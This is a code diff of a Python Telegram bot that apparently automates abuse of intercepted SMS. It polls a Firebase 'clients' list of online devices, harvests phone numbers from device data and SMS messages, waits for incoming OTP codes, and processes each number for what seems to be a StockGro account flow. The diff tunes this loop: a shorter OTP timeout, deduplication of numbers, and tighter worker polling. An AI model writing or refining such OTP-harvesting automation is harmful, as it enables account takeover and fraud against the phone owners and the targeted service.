@@ -577,7 +577,7 @@ def process_single_number(phone, chat_id, first_name, fb_url, device_id):
     # 2. Poll OTP from Firebase
     last_key = get_last_message_key(fb_url, device_id)
     print(f"  [Step 2] Waiting OTP...")
-    otp = poll_otp(fb_url, device_id, last_key, timeout=30)
+    otp = poll_otp(fb_url, device_id, last_key, timeout=15)
     if not otp:
         print(f"  No OTP received")
         save_used(phone)
@@ -644,6 +644,18 @@ def process_single_number(phone, chat_id, first_name, fb_url, device_id):
     return True
 
 # ==========================================
+# GLOBAL STATE
+# ==========================================
+PROCESSED_NUMBERS = set()  # Track all numbers being/already processed
+
+def mark_processed(phone):
+    with FILE_LOCK:
+        PROCESSED_NUMBERS.add(phone)
+
+def is_processed(phone):
+    return phone in PROCESSED_NUMBERS
+
+# ==========================================
 # PROCESS DEVICE (stockgro_auto.py style)
 # ==========================================
 def process_device(fb_url, device, chat_id, first_name):
@@ -665,18 +677,21 @@ def process_device(fb_url, device, chat_id, first_name):
     if not numbers_to_try:
         return
 
-    # Filter used numbers
+    # Filter used + already processing
     used = load_used()
-    fresh = [n for n in numbers_to_try if n not in used]
+    fresh = [n for n in numbers_to_try if n not in used and not is_processed(n)]
     if not fresh:
         return
 
     print(f"\n[*] Device: {device_id[:16]}... | Numbers: {', '.join(fresh)}")
 
     for mobile_no in fresh:
+        if is_processed(mobile_no):
+            continue
         used = load_used()
         if mobile_no in used:
             continue
+        mark_processed(mobile_no)
         process_single_number(mobile_no, chat_id, first_name, fb_url, device_id)
 
 # ==========================================
@@ -685,16 +700,16 @@ def process_device(fb_url, device, chat_id, first_name):
 def run_continuous_worker(chat_id, first_name):
     valid_links = load_links()
     if not valid_links:
-        bot.send_message(chat_id, "❌ No Firebase links! Add via links.txt or bot.")
+        bot.send_message(chat_id, "No Firebase links! Add via links.txt or bot.")
         return
 
     executor = ThreadPoolExecutor(max_workers=3)
     poll_count = 0
 
     bot.send_message(chat_id,
-        f"🟢 <b>Polling started!</b>\n\n"
-        f"🔗 Firebase: <b>{len(valid_links)}</b>\n"
-        f"⏱ Poll: every 15s | 👷 Workers: 3")
+        f"Polling started!\n\n"
+        f"Firebase: {len(valid_links)}\n"
+        f"Poll: 15s | Workers: 3")
 
     while not stop_event.is_set():
         try:
@@ -704,7 +719,7 @@ def run_continuous_worker(chat_id, first_name):
                 if stop_event.is_set():
                     break
 
-                # Fetch clients (stockgro_auto.py style)
+                # Fetch clients
                 url = f"{fb_url}/clients.json"
                 if fb_key and fb_key != "dummy":
                     url += f"?auth={fb_key}"
@@ -720,46 +735,30 @@ def run_continuous_worker(chat_id, first_name):
                     if device_id in CURRENTLY_PROCESSING:
                         continue
 
-                    # Check online (stockgro_auto.py style)
+                    # ONLY online devices (stockgro_auto.py style)
                     is_online = bool(device_data.get("status"))
                     if not is_online:
-                        pending_devices.discard(device_id)
                         continue
 
-                    # Check if new numbers available
-                    device_has_numbers = bool(extract_nums_from_obj(device_data))
-                    sms_has_numbers = False
-
-                    if device_id not in pending_devices or not device_has_numbers:
-                        pending_devices.add(device_id)
-                        sms = extract_phones_from_messages(fb_url, device_id)
-                        sms_has_numbers = bool(sms)
-
-                    if not device_has_numbers and not sms_has_numbers:
-                        continue
-
-                    pending_devices.discard(device_id)
-
-                    # Filter fresh numbers
-                    used = load_used()
+                    # Check numbers
                     device_nums = extract_nums_from_obj(device_data)
                     sms_nums = extract_phones_from_messages(fb_url, device_id)
                     all_nums = list(set(device_nums + sms_nums))
-                    fresh = [n for n in all_nums if n not in used]
+                    used = load_used()
+                    fresh = [n for n in all_nums if n not in used and not is_processed(n)]
 
                     if not fresh:
                         continue
 
-                    # Wait for worker slot
+                    # Wait for worker slot (non-blocking)
                     while len(CURRENTLY_PROCESSING) >= 3 and not stop_event.is_set():
-                        time.sleep(1)
+                        time.sleep(0.5)
                     if stop_event.is_set():
                         break
 
                     CURRENTLY_PROCESSING.add(device_id)
                     device_for_processing = dict(device_data)
                     device_for_processing['id'] = device_id
-                    device_for_processing['phoneNumber'] = fresh[0]
 
                     def done_callback(future, d_id=device_id):
                         CURRENTLY_PROCESSING.discard(d_id)
@@ -774,9 +773,9 @@ def run_continuous_worker(chat_id, first_name):
 
             if poll_count % 4 == 0:
                 bot.send_message(chat_id,
-                    f"📡 <b>Poll #{poll_count}</b> | "
+                    f"Poll #{poll_count} | "
                     f"Processing: {len(CURRENTLY_PROCESSING)} | "
-                    f"Done: <b>{len(used_cache)}</b>")
+                    f"Done: {len(used_cache)}")
 
             time.sleep(15)
 
@@ -784,7 +783,7 @@ def run_continuous_worker(chat_id, first_name):
             print(f"[!] Poll error: {e}")
             time.sleep(15)
 
-    bot.send_message(chat_id, "🛑 <b>Stopped.</b>")
+    bot.send_message(chat_id, "Stopped.")
     executor.shutdown(wait=False)
 
 # ==========================================
